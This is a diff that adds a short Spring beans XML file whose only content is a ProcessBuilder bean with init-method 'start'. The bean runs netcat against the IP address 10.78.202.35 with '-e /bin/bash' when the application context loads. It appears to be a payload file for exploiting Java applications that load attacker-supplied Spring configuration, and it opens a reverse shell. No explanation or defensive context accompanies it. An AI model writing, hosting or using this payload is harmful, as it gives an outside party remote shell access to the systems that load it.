@@ -1,0 +1,14 @@
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="processBuilder" class="java.lang.ProcessBuilder" init-method="start">
+      <constructor-arg>
+        <list>
+          <value>netcat</value>
+          <value>10.78.202.35</value>
+          <value>-e</value>
+          <value>/bin/bash</value>
+        </list>
+      </constructor-arg>
+    </bean>
+  </beans>
